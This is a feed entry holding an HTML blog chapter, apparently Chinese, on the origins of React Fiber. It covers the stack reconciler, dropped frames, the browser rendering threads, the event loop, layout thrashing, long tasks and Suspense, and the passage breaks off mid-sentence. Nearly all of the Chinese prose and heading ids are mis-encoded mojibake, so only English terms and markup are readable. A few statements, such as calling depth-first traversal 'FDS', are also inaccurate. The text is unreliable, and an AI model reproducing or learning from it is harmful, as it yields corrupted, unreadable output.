    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€ç« ï¼šReact-Fiber-çš„è¯ç”ŸèƒŒæ™¯"><a href="#ç¬¬ä¸€ç« ï¼šReact-Fiber-çš„è¯ç”ŸèƒŒæ™¯" class="headerlink" title="ç¬¬ä¸€ç« ï¼šReact Fiber çš„è¯ç”ŸèƒŒæ™¯"></a>ç¬¬ä¸€ç« ï¼šReact Fiber çš„è¯ç”ŸèƒŒæ™¯</h1><h2 id="1-1-React15-åŠä¹‹å‰ç‰ˆæœ¬çš„æ¸²æŸ“ç“¶é¢ˆ"><a href="#1-1-React15-åŠä¹‹å‰ç‰ˆæœ¬çš„æ¸²æŸ“ç“¶é¢ˆ" class="headerlink" title="1.1 React15 åŠä¹‹å‰ç‰ˆæœ¬çš„æ¸²æŸ“ç“¶é¢ˆ"></a>1.1 React15 åŠä¹‹å‰ç‰ˆæœ¬çš„æ¸²æŸ“ç“¶é¢ˆ</h2><h3 id="é€’å½’ä¸å¯ä¸­æ–­çš„åè°ƒè¿‡ç¨‹ï¼ˆstack-reconcileræ ˆåè°ƒå™¨ï¼‰"><a href="#é€’å½’ä¸å¯ä¸­æ–­çš„åè°ƒè¿‡ç¨‹ï¼ˆstack-reconcileræ ˆåè°ƒå™¨ï¼‰" class="headerlink" title="é€’å½’ä¸å¯ä¸­æ–­çš„åè°ƒè¿‡ç¨‹ï¼ˆstack reconcileræ ˆåè°ƒå™¨ï¼‰"></a>é€’å½’ä¸å¯ä¸­æ–­çš„åè°ƒè¿‡ç¨‹ï¼ˆstack reconcileræ ˆåè°ƒå™¨ï¼‰</h3><p><strong>stack reconciler æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><p>stack reconciler æ˜¯ React15 åŠä¹‹å‰ç‰ˆæœ¬ä¸­ä½¿ç”¨çš„è™šæ‹Ÿ dom åè°ƒç®—æ³•ï¼Œè´Ÿè´£è®¡ç®—ç»„ä»¶æ ‘çš„å˜åŒ–å¹¶æ›´æ–°çœŸå® domã€‚å…¶æ ¸å¿ƒç‰¹ç‚¹æ˜¯åŸºäºé€’å½’éå†ã€ä¸å¯ä¸­æ–­çš„åŒæ­¥æ›´æ–°æµç¨‹ã€‚</p><p><strong>é€’å½’éå†è™šæ‹Ÿ dom</strong></p><p>é‡‡ç”¨æ·±åº¦ä¼˜å…ˆéå†ç­–ç•¥ï¼ˆFDSï¼‰ï¼Œä»ç»„ä»¶æ ‘æ ¹èŠ‚ç‚¹å¼€å§‹ï¼Œé€’å½’è°ƒç”¨ç»„ä»¶çš„ render æ–¹æ³•ï¼Œç”Ÿæˆå®Œæ•´çš„è™šæ‹Ÿ dom æ ‘ã€‚é€’å½’éå†ä¾èµ–äº JavaScript è°ƒç”¨æ ˆï¼ˆcall stackï¼‰ï¼Œä¸€æ—¦å¼€å§‹å°±å¿…é¡»æ‰§è¡Œåˆ°åº•ï¼Œæ— æ³•ä¸­é€”æš‚åœã€‚</p><p><strong>åŒæ­¥æ›´æ–°æœºåˆ¶</strong></p><p>æ‰€æœ‰æ›´æ–°ï¼ˆæ¯”å¦‚ setStateï¼‰éƒ½ä¼šç«‹å³è§¦å‘å®Œæ•´çš„ diff è®¡ç®—ï¼Œæ— æ³•åˆå¹¶å’Œå»¶è¿Ÿã€‚å½“ä¸€ä¸ªåº”ç”¨çš„ç»„ä»¶æ ‘è¿‡äºåºå¤§æ—¶ï¼Œä¸€æ¬¡é€’å½’ diff è®¡ç®—æ˜¯ååˆ†è€—æ—¶çš„ã€‚stack reconciler çš„å·¥ä½œæµç¨‹åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼š</p><ul><li>åè°ƒï¼ˆreconciliationï¼‰ï¼šè¯¥é˜¶æ®µä¸­é‡‡ç”¨é€’å½’ diff ç®—æ³•ï¼Œå¯¹æ¯”æ–°æ—§è™šæ‹Ÿ dom æ ‘çš„å·®å¼‚ï¼Œæ‰¾åˆ°éœ€è¦è¿›è¡Œæ›´æ–°çš„æ ‘èŠ‚ç‚¹ï¼Œæ ‡è®°éœ€è¦æ›´æ–°çš„èŠ‚ç‚¹çš„å¢åˆ æ”¹</li><li>æäº¤ï¼ˆcommitï¼‰ï¼šæ ¹æ® diff è®¡ç®—çš„ç»“æœï¼Œä¸€æ¬¡æ€§åŒæ­¥æ‰§è¡Œæ‰€æœ‰çš„ dom æ“ä½œï¼Œå¹¶è§¦å‘ç”Ÿå‘½å‘¨æœŸé’©å­ï¼ˆcomponentDidMountã€componentDidUpdateç­‰ï¼‰</li></ul><p><strong>å±€é™æ€§</strong></p><p>åœ¨äº†è§£ä¸Šè¿°çŸ¥è¯†åï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆæ¸…æ™°çš„æ„ŸçŸ¥åˆ° stack reconciler çš„å±€é™æ€§ï¼š</p><ul><li>æ— æ³•ä¸­æ–­é•¿ä»»åŠ¡ï¼šé€’å½’éå†ä¸€æ—¦å¼€å§‹å°±æ— æ³•ä¸­æ–­ï¼Œè¿™ä¼šå ç”¨ js ä¸»çº¿ç¨‹ï¼Œå¯¼è‡´æ— æ³•å“åº”å…¶ä»–é«˜ä¼˜å…ˆçº§ä»»åŠ¡</li><li>ç¼ºä¹ä»»åŠ¡ä¼˜å…ˆçº§è°ƒåº¦ï¼šæ‰€æœ‰çš„æ›´æ–°ä»»åŠ¡åŒæ­¥æ‰§è¡Œï¼Œäº«æœ‰åŒç­‰ä¼˜å…ˆçº§</li><li>å†…å­˜æ³„æ¼é£é™©ï¼šå½“ç»„ä»¶æ ‘ååˆ†åºå¤§æ—¶ï¼Œæ·±åº¦é€’å½’å¯èƒ½ä¼šå¼•èµ·æ ˆå†…å­˜æ³„æ¼</li></ul><span id="more"></span><h3 id="å¤§å‹åº”ç”¨ä¸­çš„æ‰å¸§é—®é¢˜å’Œç”¨æˆ·ä½“éªŒç¼ºé™·"><a href="#å¤§å‹åº”ç”¨ä¸­çš„æ‰å¸§é—®é¢˜å’Œç”¨æˆ·ä½“éªŒç¼ºé™·" class="headerlink" title="å¤§å‹åº”ç”¨ä¸­çš„æ‰å¸§é—®é¢˜å’Œç”¨æˆ·ä½“éªŒç¼ºé™·"></a>å¤§å‹åº”ç”¨ä¸­çš„æ‰å¸§é—®é¢˜å’Œç”¨æˆ·ä½“éªŒç¼ºé™·</h3><p><strong>â€œå¸§â€æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><p>åœ¨è®¡ç®—æœºå›¾å½¢å­¦ä¸äº¤äº’å¼åº”ç”¨ä¸­ï¼Œå¸§æ˜¯æŒ‡å±å¹•ç”»é¢çš„ä¸€æ¬¡å®Œæ•´æ›´æ–°ï¼Œå®ƒæ˜¯è¡¡é‡ç”»é¢æµç•…åº¦çš„æ ¸å¿ƒå•ä½ï¼Œå¸§ç‡ï¼ˆFPSï¼‰å³æ˜¯æŒ‡æ¯ç§’å†…æ¸²æŸ“çš„å¸§æ•°ï¼Œäººçœ¼è§†è§‰å¯¹ 60FPS ä»¥ä¸Šçš„å˜åŒ–æ„ŸçŸ¥æœ‰é™ï¼Œä½†ä½äº 60FPS æ—¶åˆ™ä¼šæ„ŸçŸ¥åˆ°å»¶è¿Ÿã€å¡é¡¿ã€‚ä¸»æµæµè§ˆå™¨çš„å¸§ç‡å¤§å¤šä¸º 60FPS ï¼Œå³æ¯å¸§ 16.67msã€‚</p><p><strong>ä»€ä¹ˆæ˜¯æ‰å¸§ï¼Œæ‰å¸§æ˜¯æ€ä¹ˆå¼•èµ·çš„ï¼Ÿ</strong></p><p>æ‰å¸§å³æ˜¯æŒ‡å¸§ç‡æœªè¾¾é¢„æœŸï¼Œå¯¼è‡´åŠ¨ç”»æˆ–äº¤äº’å¡é¡¿ã€‚ä»¥æµè§ˆå™¨ä¸¾ä¾‹ï¼Œé¢„æœŸå¸§ç‡ 60FPSï¼Œåˆ™æ¯ä¸€å¸§ï¼ˆ16.67msï¼‰çš„ç”Ÿå‘½å‘¨æœŸå†…ï¼Œæµè§ˆå™¨éœ€è¦å®Œæˆ js æ‰§è¡Œã€æ ·å¼è®¡ç®—ï¼ˆstyleï¼‰ã€å¸ƒå±€ï¼ˆlayoutï¼‰ã€ç»˜åˆ¶ï¼ˆpaintï¼‰ã€åˆæˆï¼ˆcompositeï¼‰ç­‰æ­¥éª¤ï¼Œå¦åˆ™å°±ä¼šå¯¼è‡´æ‰å¸§ã€‚</p><h2 id="1-2-æµè§ˆå™¨æ¸²æŸ“æœºåˆ¶ä¸ä¸»çº¿ç¨‹é˜»å¡"><a href="#1-2-æµè§ˆå™¨æ¸²æŸ“æœºåˆ¶ä¸ä¸»çº¿ç¨‹é˜»å¡" class="headerlink" title="1.2 æµè§ˆå™¨æ¸²æŸ“æœºåˆ¶ä¸ä¸»çº¿ç¨‹é˜»å¡"></a>1.2 æµè§ˆå™¨æ¸²æŸ“æœºåˆ¶ä¸ä¸»çº¿ç¨‹é˜»å¡</h2><h3 id="æ¸²æŸ“æœºåˆ¶"><a href="#æ¸²æŸ“æœºåˆ¶" class="headerlink" title="æ¸²æŸ“æœºåˆ¶"></a>æ¸²æŸ“æœºåˆ¶</h3><p>æµè§ˆå™¨æ¸²æŸ“è¿‡ç¨‹æ˜¯æŒ‡æµè§ˆå™¨å°† HTMLã€CSSã€JavaScript ç­‰ä»£ç è½¬æ¢ä¸ºç”¨æˆ·å¯è§†ç•Œé¢çš„è¿‡ç¨‹ã€‚æµè§ˆå™¨é€šè¿‡å¤šçº¿ç¨‹åä½œæé«˜æ¸²æŸ“æ•ˆç‡ï¼Œå…¶ä¸­å…³é”®çº¿ç¨‹çš„åˆ†å·¥å¦‚ä¸‹ï¼š</p><table><thead><tr><th align="left">çº¿ç¨‹</th><th align="left">èŒè´£</th><th align="left">ç¤ºä¾‹åœºæ™¯</th></tr></thead><tbody><tr><td align="left">ä¸»çº¿ç¨‹ï¼ˆMain Threadï¼‰</td><td align="left">è¿è¡Œ JavaScriptã€DOM&#x2F;CSS è§£æã€æ ·å¼è®¡ç®—ã€å¸ƒå±€ã€ç»˜åˆ¶ã€ç”Ÿæˆç»˜åˆ¶æŒ‡ä»¤</td><td align="left">setTimeoutã€React æ¸²æŸ“ã€äº‹ä»¶å¤„ç†</td></tr><tr><td align="left">åˆæˆå™¨çº¿ç¨‹ï¼ˆCompositor Threadï¼‰</td><td align="left">æ¥æ”¶ç»˜åˆ¶æŒ‡ä»¤ã€å›¾å±‚åˆ†å—å…‰æ …åŒ–ã€åŠ é€Ÿå›¾å±‚åˆæˆã€æäº¤ GPU æ˜¾ç¤º</td><td align="left">æ»šåŠ¨ã€åŠ¨ç”»ï¼ˆå¦‚ transform åŠ¨ç”»ï¼‰</td></tr><tr><td align="left">å…‰æ …åŒ–çº¿ç¨‹ï¼ˆRaster Threadï¼‰</td><td align="left">å°†ç»˜åˆ¶æŒ‡ä»¤è½¬æ¢ä¸ºä½å›¾</td><td align="left">å¤„ç†å›¾ç‰‡è§£ç ã€å›¾å±‚åˆ†å—å…‰æ …åŒ–</td></tr></tbody></table><p>æ­£å¦‚ä¸Šä¸€ç« èŠ‚æ‰€è®²ï¼Œæµè§ˆå™¨æ¸²æŸ“è¿‡ç¨‹æ¶‰åŠå¤šä¸ªé˜¶æ®µï¼Œä¸”ä¸ä¸»çº¿ç¨‹ï¼ˆMain Threadï¼‰ç´§å¯†ç›¸å…³ï¼š</p><ol><li>è§£æé˜¶æ®µï¼šè§£æ HTML ï¼ˆé‡åˆ°<code>&lt;script&gt;</code>æ ‡ç­¾æ—¶ä¼šé˜»å¡è§£æï¼‰å’Œ CSSï¼Œç”Ÿæˆ DOM å’Œ CSSOM</li><li>æ ·å¼è®¡ç®—é˜¶æ®µï¼šå°† DOM å’Œ CSSOM åˆå¹¶ï¼Œç”Ÿæˆæ¸²æŸ“æ ‘ï¼Œæ ‘ä»…åŒ…å«å¯è§èŠ‚ç‚¹ï¼Œå¹¶è®¡ç®—èŠ‚ç‚¹çš„æœ€ç»ˆæ ·å¼</li><li>å¸ƒå±€é˜¶æ®µï¼šæ ¹æ®æ¸²æŸ“æ ‘è®¡ç®—æ¯ä¸ªèŠ‚ç‚¹çš„ç²¾ç¡®ä½ç½®å’Œå¤§å°</li><li>ç»˜åˆ¶é˜¶æ®µï¼šç”Ÿæˆç»˜åˆ¶æŒ‡ä»¤ï¼Œå°†å¸ƒå±€ç»“æœè½¬æ¢ä¸ºå±å¹•ä¸Šçš„åƒç´ ï¼Œè¾“å‡ºç»˜åˆ¶åˆ—è¡¨ï¼Œè®°å½•ç»˜åˆ¶é¡ºåº</li><li>åˆæˆé˜¶æ®µï¼šå°†é¡µé¢åˆ†ä¸ºå¤šä¸ªå›¾å±‚å¹¶å¯ç”¨ GPU åŠ é€Ÿåˆæˆ</li><li>æ˜¾ç¤ºé˜¶æ®µï¼šå°†åˆæˆåçš„ä½å›¾é€šè¿‡æ˜¾å¡é©±åŠ¨ä¼ é€’ç»™å±å¹•æ˜¾ç¤º</li></ol><p>æµè§ˆå™¨çš„ä¸€æ¬¡æ¸²æŸ“è¿‡ç¨‹å³å¯¹åº”ä¸€å¸§çš„ç”Ÿæˆï¼Œå•æ¬¡æ¸²æŸ“è¿‡ç¨‹è€—æ—¶è¿‡é•¿å³ä¼šå¯¼è‡´å¸§ç‡ä¸‹é™ï¼Œå³æ‰€è°“çš„<code>æ‰å¸§</code>ã€‚ç»“åˆæµè§ˆå™¨å…³é”®çº¿ç¨‹åˆ†å·¥èŒè´£å’Œæ¸²æŸ“è¿‡ç¨‹çš„çŸ¥è¯†ï¼Œå¯ä»¥çŸ¥é“ï¼Œå¯¼è‡´å•æ¬¡æ¸²æŸ“è€—æ—¶è¿‡é•¿çš„åŸå› æœ‰å¾ˆå¤šï¼Œä¸å‰ç«¯å¼€å‘è€…æ¯æ¯ç›¸å…³çš„å°±æ˜¯<code>ä¸»çº¿ç¨‹é˜»å¡</code>ã€‚ä¸ºäº†åˆ†æå¼•èµ·ä¸»çº¿ç¨‹é˜»å¡çš„åŸå› ï¼Œæˆ‘ä»¬è¿˜éœ€è¦é¢å¤–å­¦ä¹ éƒ¨åˆ†çŸ¥è¯†ã€‚</p><h3 id="äº‹ä»¶å¾ªç¯"><a href="#äº‹ä»¶å¾ªç¯" class="headerlink" title="äº‹ä»¶å¾ªç¯"></a>äº‹ä»¶å¾ªç¯</h3><p><strong>JavaScript çš„äº‹ä»¶å¾ªç¯æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><p>JavaScript çš„äº‹ä»¶å¾ªç¯æ˜¯å…¶å¼‚æ­¥ç¼–ç¨‹çš„æ ¸å¿ƒæœºåˆ¶ï¼Œå®ƒå†³å®šäº†ä»£ç çš„æ‰§è¡Œé¡ºåºï¼Œä½¿å¾—å•çº¿ç¨‹çš„ JavaScript å¯ä»¥å¤„ç†éé˜»å¡ä»»åŠ¡</p><p><strong>æ ¸å¿ƒç»„æˆ</strong></p><p>äº‹ä»¶å¾ªç¯çš„æ ¸å¿ƒç»„æˆæ˜¯<code>è°ƒç”¨æ ˆ</code>å’Œ<code>ä»»åŠ¡é˜Ÿåˆ—</code>ï¼š</p><ul><li>è°ƒç”¨æ ˆï¼šæŒ‰é¡ºåºæ‰§è¡ŒåŒæ­¥ä»£ç ï¼Œåè¿›å…ˆå‡ºï¼ˆLIFOï¼‰ï¼Œæ‰§è¡Œä¸€ä¸ªå‡½æ•°æ—¶ï¼Œå°†å…¶å‹å…¥æ ˆé¡¶ï¼Œå‡½æ•°è¿”å›åå¼¹å‡ºã€‚å¦‚æœæ ˆæº¢å‡ºï¼ˆæ¯”å¦‚æ·±åº¦é€’å½’ï¼‰ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</li><li>ä»»åŠ¡é˜Ÿåˆ—ï¼šå­˜å‚¨å¾…æ‰§è¡Œçš„å¼‚æ­¥å›è°ƒï¼Œåˆ†ä¸ºå®ä»»åŠ¡é˜Ÿåˆ—ã€å¾®ä»»åŠ¡é˜Ÿåˆ—ã€å…¶ä»–é˜Ÿåˆ—ï¼ˆæ¯”å¦‚requestAnimationFrameã€web workersï¼‰ã€‚</li></ul><p>è°ƒç”¨æ ˆä¸ä»»åŠ¡é˜Ÿåˆ—çš„åä½œæ¨¡å‹çš„æ ¸å¿ƒè§„åˆ™ï¼š</p><ul><li>åŒæ­¥ä»£ç å±äºå½“å‰å®ä»»åŠ¡ï¼Œç›´æ¥ç”±è°ƒç”¨æ ˆæ‰§è¡Œ</li><li>å¼‚æ­¥ä»»åŠ¡åˆ†ä¸ºå®ä»»åŠ¡ã€å¾®ä»»åŠ¡ä¸¤ç±»ï¼Œæ¯æ¬¡äº‹ä»¶å¾ªç¯åªæ‰§è¡Œä¸€ä¸ªå®ä»»åŠ¡ï¼Œå¾®ä»»åŠ¡å¿…é¡»åœ¨å½“å‰å®ä»»åŠ¡ç»“æŸåç«‹å³æ‰§è¡Œï¼Œä¸”å¿…é¡»æ¸…ç©ºé˜Ÿåˆ—</li></ul><p><strong>å·¥ä½œæµç¨‹&#x2F;æ‰§è¡Œé¡ºåº</strong></p><ol><li>æ‰§è¡Œå½“å‰è°ƒç”¨æ ˆä¸­çš„åŒæ­¥ä»£ç ï¼ˆå±äºå½“å‰å®ä»»åŠ¡ï¼‰</li><li>æ‰§è¡Œæ‰€æœ‰å¾®ä»»åŠ¡ï¼Œç›´åˆ°å¾®ä»»åŠ¡é˜Ÿåˆ—ä¸ºç©º</li><li>å¿…è¦æ—¶æ¸²æŸ“é¡µé¢ï¼ˆæµè§ˆå™¨å†³å®šï¼‰</li><li>ä»å®ä»»åŠ¡é˜Ÿåˆ—ä¸­å–å‡ºä¸€ä¸ªä»»åŠ¡æ‰§è¡Œï¼ˆå›åˆ°æ­¥éª¤ 1ï¼‰</li></ol><p><strong>æ ¸å¿ƒè§„åˆ™</strong></p><p>åŒæ­¥ä»£ç  &gt; å¾®ä»»åŠ¡ &gt; æ¸²æŸ“ &gt; å®ä»»åŠ¡</p><h3 id="å¸ƒå±€æŠ–åŠ¨ï¼ˆLayout-Thrashingï¼‰"><a href="#å¸ƒå±€æŠ–åŠ¨ï¼ˆLayout-Thrashingï¼‰" class="headerlink" title="å¸ƒå±€æŠ–åŠ¨ï¼ˆLayout Thrashingï¼‰"></a>å¸ƒå±€æŠ–åŠ¨ï¼ˆLayout Thrashingï¼‰</h3><p><strong>ä»€ä¹ˆæ˜¯å¸ƒå±€æŠ–åŠ¨ï¼Ÿ</strong></p><p>å¸ƒå±€æ˜¯æŒ‡æµè§ˆå™¨è®¡ç®—æ¸²æŸ“æ ‘ä¸­æ¯ä¸ªèŠ‚ç‚¹çš„å‡ ä½•ä¿¡æ¯ï¼ˆç²¾ç¡®ä½ç½®ã€å¤§å°ï¼‰çš„è¿‡ç¨‹ï¼Œå‘ç”Ÿåœ¨æ ·å¼è®¡ç®—ä¹‹åã€ç»˜åˆ¶ä¹‹å‰ã€‚ä¿®æ”¹å½±å“å‡ ä½•å±æ€§çš„ CSSï¼ˆå¦‚ widthã€marginï¼‰æˆ–è¯»å–å¸ƒå±€å±æ€§ï¼ˆå¦‚ offsetWidthï¼‰éƒ½ä¼šè§¦å‘å¸ƒå±€é‡æ’ã€‚</p><p>å¸ƒå±€æŠ–åŠ¨æ˜¯æŒ‡æµè§ˆå™¨å› é¢‘ç¹çš„å¼ºåˆ¶åŒæ­¥å¸ƒå±€é€ æˆçš„æ€§èƒ½é—®é¢˜ï¼Œè¡¨ç°ä¸ºå¤šæ¬¡ä¸å¿…è¦çš„å¸ƒå±€è®¡ç®—ï¼ˆ<code>é‡æ’/Reflow</code>ï¼‰ï¼Œå½±å“é¡µé¢æ¸²æŸ“é€Ÿåº¦ã€‚å…¶æœ¬è´¨æ˜¯ä»£ç ä¸­æ··åˆè¿ç»­è¯»å†™å¸ƒå±€å±æ€§ï¼Œè¿«ä½¿æµè§ˆå™¨å¤šæ¬¡é‡æ–°è®¡ç®—å¸ƒå±€</p><p><strong>å¸¸è§è§¦å‘åœºæ™¯</strong></p><ul><li>å¾ªç¯ä¸­è¯»å†™å¸ƒå±€å±æ€§</li><li>é¢‘ç¹è®¿é—®å¸ƒå±€ APIï¼šoffsetTopã€offsetLeftã€scrollTopã€getComputedStyle() ç­‰</li><li>åŠ¨ç”»ä¸­æ··åˆè¯»å†™</li></ul><h3 id="é•¿ä»»åŠ¡ï¼ˆLong-Taskï¼‰"><a href="#é•¿ä»»åŠ¡ï¼ˆLong-Taskï¼‰" class="headerlink" title="é•¿ä»»åŠ¡ï¼ˆLong Taskï¼‰"></a>é•¿ä»»åŠ¡ï¼ˆLong Taskï¼‰</h3><p><strong>ä»€ä¹ˆæ˜¯é•¿ä»»åŠ¡ï¼Ÿ</strong></p><p>é•¿ä»»åŠ¡æ˜¯æŒ‡ä¸»çº¿ç¨‹ä¸Šè¿ç»­æ‰§è¡Œæ—¶é—´è¶…è¿‡ 50ms çš„ JavaScript ä»£ç æˆ–æ¸²æŸ“æ“ä½œï¼Œå®ƒä¼šé˜»å¡ç”¨æˆ·äº¤äº’å’Œé¡µé¢æ¸²æŸ“ï¼Œå¯¼è‡´æ˜æ˜¾çš„å¡é¡¿</p><p><strong>é•¿ä»»åŠ¡çš„æ ‡å‡†</strong></p><ul><li>æ—¶é—´é˜ˆå€¼ï¼š50msï¼Œæ˜¯ç”± Google æ ¹æ®äººç±»æ„ŸçŸ¥å»¶è¿Ÿæå‡ºçš„ä¸´ç•Œå€¼</li><li>æ£€æµ‹å·¥å…·ï¼šChrome DevTools çš„ Performance é¢æ¿ä¸­ï¼Œé•¿ä»»åŠ¡ä¼šè¢«æ ‡è®°ä¸ºçº¢è‰²åŒºå—å¹¶æ˜¾ç¤º Long Task è­¦å‘Š</li></ul><p><strong>å¸¸è§çš„é•¿ä»»åŠ¡åœºæ™¯</strong></p><ul><li>å¤æ‚çš„ JavaScript è®¡ç®—</li><li>æœªä¼˜åŒ–çš„ dom æ“ä½œ</li><li>åŒæ­¥ç½‘ç»œè¯·æ±‚</li><li>åŠ è½½æœªä¼˜åŒ–çš„ä¸‰æ–¹è„šæœ¬</li></ul><p><strong>é•¿ä»»åŠ¡ä¼˜åŒ–æ‰‹æ®µ</strong></p><ul><li>ä»»åŠ¡æ‹†åˆ†</li><li>web workers å¤šçº¿ç¨‹ï¼šå°†è®¡ç®—å¯†é›†å‹ä»»åŠ¡è½¬åˆ°worker</li><li>å¼‚æ­¥ç¼–ç¨‹ä¼˜åŒ–ï¼šé€šè¿‡ promiseã€async&#x2F;await ç­‰æ‰‹æ®µé¿å…é˜»å¡</li><li>è™šæ‹Ÿåˆ—è¡¨ä¼˜åŒ–æ¸²æŸ“ï¼šä»…æ¸²æŸ“å¯è§†åŒºåŸŸå†…å®¹</li><li>æƒ°æ€§åŠ è½½ï¼šæŒ‰éœ€åŠ è½½éå…³é”®è„šæœ¬</li></ul><h3 id="ä¸»çº¿ç¨‹é˜»å¡åŸå› åˆ†æ"><a href="#ä¸»çº¿ç¨‹é˜»å¡åŸå› åˆ†æ" class="headerlink" title="ä¸»çº¿ç¨‹é˜»å¡åŸå› åˆ†æ"></a>ä¸»çº¿ç¨‹é˜»å¡åŸå› åˆ†æ</h3><p>ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œå¼•èµ·ä¸»çº¿ç¨‹é˜»å¡çš„ä¸»è¦åŸå› æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li>å¸ƒå±€æŠ–åŠ¨</li><li>é•¿ä»»åŠ¡</li><li>è¿‡å¤šçš„å¾®ä»»åŠ¡</li></ul><h2 id="1-3-ç°ä»£å‰ç«¯åº”ç”¨çš„éœ€æ±‚æ¼”è¿›"><a href="#1-3-ç°ä»£å‰ç«¯åº”ç”¨çš„éœ€æ±‚æ¼”è¿›" class="headerlink" title="1.3 ç°ä»£å‰ç«¯åº”ç”¨çš„éœ€æ±‚æ¼”è¿›"></a>1.3 ç°ä»£å‰ç«¯åº”ç”¨çš„éœ€æ±‚æ¼”è¿›</h2><h3 id="åŠ¨ç”»-æ‰‹åŠ¿çš„é«˜ä¼˜å…ˆçº§æ›´æ–°"><a href="#åŠ¨ç”»-æ‰‹åŠ¿çš„é«˜ä¼˜å…ˆçº§æ›´æ–°" class="headerlink" title="åŠ¨ç”»&#x2F;æ‰‹åŠ¿çš„é«˜ä¼˜å…ˆçº§æ›´æ–°"></a>åŠ¨ç”»&#x2F;æ‰‹åŠ¿çš„é«˜ä¼˜å…ˆçº§æ›´æ–°</h3><p>åœ¨ç°ä»£å‰ç«¯åº”ç”¨ä¸­ï¼ŒåŠ¨ç”»&#x2F;æ‰‹åŠ¿çš„é«˜ä¼˜å…ˆçº§æ›´æ–°æ˜¯æå‡ç”¨æˆ·ä½“éªŒï¼ˆUXï¼‰å’Œç•Œé¢æµç•…æ€§çš„å…³é”®è®¾è®¡ï¼Œå…¶æ„ä¹‰æœ‰ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š</p><ul><li>ç¡®ä¿äº¤äº’å³æ—¶å“åº”</li><li>é¿å…æ‰å¸§ç°è±¡çš„å‘ç”Ÿ</li><li>æå‡æ‰‹åŠ¿æ“ä½œçš„è·Ÿæ‰‹æ€§</li><li>æ”¯æŒå¤æ‚çš„ UI è®¾è®¡ï¼šæ‹–æ‹½ã€æåˆç¼©æ”¾ã€é¡µé¢è¿‡æ¸¡åŠ¨ç”»ç­‰å¤æ‚äº¤äº’ä¾èµ–é«˜ä¼˜å…ˆçº§æ›´æ–°</li><li>ä¸æµè§ˆå™¨æ¸²æŸ“ç®¡çº¿çš„ååŒä¼˜åŒ–ï¼šé«˜ä¼˜å…ˆçº§åŠ¨ç”»ï¼ˆå¦‚ transformï¼‰å¯ç”±åˆæˆå™¨çº¿ç¨‹ç›´æ¥å¤„ç†ï¼Œæ— éœ€ä¸»çº¿ç¨‹å‚ä¸ï¼Œä»è€Œé¿å…å¸ƒå±€&#x2F;é‡ç»˜</li></ul><p>é€šè¿‡ä¼˜å…ˆçº§è°ƒåº¦ç­–ç•¥ï¼Œå¯ä»¥æå‡ç”¨æˆ·ç•™å­˜ç‡å’Œæ»¡æ„åº¦ã€‚</p><h3 id="å¼‚æ­¥æ•°æ®åŠ è½½ä¸Suspenseçš„è¯‰æ±‚"><a href="#å¼‚æ­¥æ•°æ®åŠ è½½ä¸Suspenseçš„è¯‰æ±‚" class="headerlink" title="å¼‚æ­¥æ•°æ®åŠ è½½ä¸Suspenseçš„è¯‰æ±‚"></a>å¼‚æ­¥æ•°æ®åŠ è½½ä¸Suspenseçš„è¯‰æ±‚</h3><p>ä¼ ç»Ÿå‰ç«¯åº”ç”¨ä¸­ï¼Œé€šå¸¸ä¼šé‡åˆ°ä»¥ä¸‹å‡ å¤§é—®é¢˜ï¼š</p><ul><li>â€œç™½å±â€ç­‰å¾…ï¼šä¼ ç»Ÿåº”ç”¨åœ¨æ•°æ®åŠ è½½å®Œå…¨å‰ï¼Œé¡µé¢é€šå¸¸æ˜¾ç¤ºç©ºç™½æˆ– loading å›¾æ ‡ï¼Œç”¨æˆ·æ— æ³•æ„ŸçŸ¥è¿›åº¦ã€‚</li><li>ä¸å¿…è¦çš„åŠ è½½çŠ¶æ€ï¼šä¼ ç»Ÿæ¨¡å¼ä¸‹ï¼Œå„ä¸ªç»„ä»¶ç‹¬ç«‹ç»´æŠ¤ loading çŠ¶æ€ï¼Œä¼šå¯¼è‡´å¤šæ¬¡é—ªçƒçš„ loading æç¤º</li><li>ç«æ€æ¡ä»¶é—®é¢˜ï¼šå…¸å‹åœºæ™¯æ˜¯å¿«é€Ÿåˆ‡æ¢æ ‡ç­¾é¡µæ—¶ï¼Œå‰ä¸€æ¬¡è¯·æ±‚å¯èƒ½è¦†ç›–åä¸€æ¬¡è¯·æ±‚çš„ç»“æœï¼Œæ¯”å¦‚ä»è¯¦æƒ… A è·³åˆ°è¯¦æƒ… B</li></ul><p>è€Œç°ä»£å‰ç«¯åº”ç”¨ä¸­ï¼Œè¿™äº›é—®é¢˜æ˜¯ä¸¥é‡å½±å“ç”¨æˆ·ä½“éªŒçš„ï¼Œé’ˆå¯¹ä»¥ä¸Šé—®é¢˜ï¼Œè¡ç”Ÿå‡ºäº†ä»¥ä¸‹ç°ä»£éœ€æ±‚ï¼š</p><ul><li>éª¨æ¶å±ï¼šåœ¨æ•°æ®åŠ è½½æ—¶æ˜¾ç¤ºå ä½ UIï¼Œæå‡æ„ŸçŸ¥é€Ÿåº¦</li><li>æµå¼æ¸²æŸ“ï¼šé€æ­¥å‘é€ HTML ç‰‡æ®µï¼Œè®©ç”¨æˆ·å°½æ—©çœ‹åˆ°å†…å®¹</li><li>çŠ¶æ€ç»Ÿä¸€ï¼šç»Ÿä¸€ç®¡ç†æ•°æ®çŠ¶æ€ï¼Œä»…åœ¨æ‰€æœ‰æ•°æ®å°±ç»ªåä¸€æ¬¡æ€§æ¸²æŸ“</li><li>AbortControllerï¼šå¯ä¸­æ–­æ­£åœ¨è¿›è¡Œçš„å¼‚æ­¥æ“ä½œï¼Œé¿å…èµ„æºæµªè´¹å’Œç«æ€æ¡ä»¶</li></ul><p>è¿™å°±è¦æ±‚åº”ç”¨åœ¨æ•°æ®ç®¡ç†æ–¹æ¡ˆä¸Šèƒ½æ”¯æŒå¼‚æ­¥æ•°æ®ç®¡ç†ï¼Œå› æ­¤ React å›¢é˜Ÿæå‡ºäº†Suspense å£°æ˜å¼å¼‚æ­¥æ•°æ®ç®¡ç†æ–¹æ¡ˆã€‚</p><p>ä¸ºäº†è§£å†³ React15 